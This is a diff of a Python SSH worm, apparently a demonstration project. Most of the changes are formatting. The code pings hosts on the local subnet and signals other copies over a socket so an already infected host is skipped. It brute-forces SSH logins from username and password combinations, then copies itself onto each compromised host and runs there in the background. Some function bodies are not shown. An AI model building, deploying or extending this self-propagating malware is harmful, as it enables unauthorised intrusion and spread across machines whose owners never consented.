@@ -1,7 +1,6 @@
 from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
 from paramiko.ssh_exception import NoValidConnectionsError
 from scp import SCPClient
-import platform
 import subprocess
 import itertools
 import socket
@@ -40,15 +39,23 @@ def is_ssh_open(hostname, username, password):
             ssh.close()
             return True
 
+
 # Uses ping to determine hosts that are responding.
 def ping(host):
-    param = "-n" if platform.system().lower() == "windows" else "-c"
-    command = ["ping", param, "1", host]
-    result = subprocess.call(command) == 0
+    command = ["ping", "-c", "1", host]
+    result = (
+        subprocess.call(
+            command,
+            # stdout=subprocess.DEVNULL,
+            # stderr=subprocess.DEVNULL
+        )
+        == 0
+    )
     return (host, result)
 
+
 # Checks if host at ip_address has already been infected. It sends a specific
-# message to the host.  If the host responds with specific response then it has 
+# message to the host.  If the host responds with specific response then it has
 # already been infected
 def check_infected(ip_address):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -61,9 +68,10 @@ def check_infected(ip_address):
     except:
         return False
 
-# Find its own local address and uses that scan local ip pool using ping to 
+
+# Find its own local address and uses that scan local ip pool using ping to
 # determine targets that are up.
-#  Uses multi threading to accomplish this asynchronously. Finally excludes its 
+#  Uses multi-threading to accomplish this asynchronously. Finally excludes its
 # own ip address from possible results.
 def find_local_targets():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -74,6 +82,8 @@ def find_local_targets():
         futures = []
         # TODO: Change back to 0, 256 after demonstration
         for i in range(0, 6):
+            # Attacks local subnet
+            # i.e. 192.168.1.0/24 assuming
             new_ip = f"{my_local_ip[0]}.{my_local_ip[1]}.{my_local_ip[2]}.{i}"
             futures.append(executor.submit(ping, host=new_ip))
 
@@ -87,8 +97,9 @@ def find_local_targets():
             if live and not check_infected(ip_address) and ip_address != my_local_ip
         ]
 
-# This function will run in a separate thread in a loop.  It is waiting for a 
-# knock knock message to which it will respond with infected.  This will inform 
+
+# This function will run in a separate thread in a loop.  It is waiting for a
+# knock knock message to which it will respond with infected.  This will inform
 # other worms that this host is infected already saving the bruteforcing efforts.
 def infected_communicator():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -104,6 +115,7 @@ def infected_communicator():
                 conn.send("infected".encode())
         conn.close()
 
+
 # Creates the cross product between usernames and passwords.
 def get_credentials():
     credentials = []
@@ -116,7 +128,8 @@ def get_credentials():
             ]
     return credentials
 
-# Uses credentials to bruteforcing ssh.  Once access is granted, it copies the 
+
+# Uses credentials to bruteforcing ssh.  Once access is granted, it copies the
 # worm.  Installs dependencies and runs in the background.
 def hack_targets(ip_addresses):
     credentials = get_credentials()
@@ -160,6 +173,8 @@ def hack_targets(ip_addresses):
                     except:
                         pass
                 break
+
+
 # Runs the communicator in a separate thread.
 thread = Thread(target=infected_communicator)
 thread.start()
@@ -169,4 +184,3 @@ targets = find_local_targets()
 hack_targets(targets)
 
 thread.join()
-
